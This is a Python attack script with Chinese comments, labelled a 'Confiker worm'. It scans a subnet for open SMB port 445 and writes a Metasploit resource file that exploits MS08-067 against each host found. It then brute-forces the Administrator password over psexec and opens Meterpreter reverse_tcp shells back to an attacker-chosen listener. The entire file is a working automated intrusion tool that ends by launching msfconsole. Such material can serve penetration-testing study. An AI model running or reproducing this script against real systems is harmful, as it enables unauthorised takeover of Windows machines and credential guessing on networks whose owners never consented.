#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-07-11 13:38:30
# @Author  : Law Paul (peicx@outlook.com)
# @Link    : http://peicx.github.io
# @Version : $Id$

'''
Confiker 蠕虫
使用MS08-067_netapi自动渗透脚本，若不存在该漏洞则自动爆破SMB用户密码进行渗透
'''
import nmap
import os
import argparse
import sys


def findTgt(subNet):
    # 该函数返回所有打开TCP 445端口的主机；
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHost = []
    for host in nmScan.all_hosts():
        state = nmScan[host]['tcp'][445]['state']
        if state == 'open':
            print('[+] Found Target Host: ' + host)
            tgtHost.append((host))
    return tgtHost


def setupHandler(configFile, lhost, lport):
    '''
    监听器，使我们能与被黑掉的主机进行交互；
    被黑掉指的是我们的Meterpreter在远程机器上运行；
    Meterpreter会主动回连我们的主机，并等候进一步命令时，
    我们需要一个multi/handler 的模块去发布命令。
    '''
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD ' +
                     'windows/meterpreter/reverse_tcp\n')
    configFile.write('set lhost ' + lhost + '\n')
    configFile.write('set lport ' + str(lport) + '\n')
    # -j 同一个job的上下文环境中执行
    # -z 不与任务进行即时交互的条件下利用对目标的漏洞
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set PAYLOAD ' +
                     'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    # 因为要黑掉多台计算机，不能同时与他们进行交互，所以使用-j -z参数
    configFile.write('exploit -j -z\n')


def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    # 暴力破解口令，远程执行一个进程
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set PAYLOAD ' +
                         'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')


def main():
    configFile = open('meta.rc', 'w')
    parser = argparse.ArgumentParser(description='Confiker worm')
    parser.add_argument('-H', dest='tgtHost', type=str,
                        help='specify the target address[es]')
    parser.add_argument('-p', dest='lport', type=str,
                        help='specify the listen port')
    parser.add_argument('-l', dest='lhost', type=str,
                        help='specify the listen address')
    parser.add_argument('-F', dest='passwdFile', type=str,
                        help='password file for SMB brute force attempt')
    options = parser.parse_args()
    if (options.tgtHost is None) or (options.lhost is None):
        print(parser.usage)
        exit(0)
    lhost = options.lhost
    lport = options.lport
    if lport is None:
        lport = '1337'
    passwdFile = options.passwdFile
    tgtHosts = findTgt(options.tgtHost)
    setupHandler(configFile, lhost, lport)
    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile is not None:
            smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
    configFile.close()
    os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()
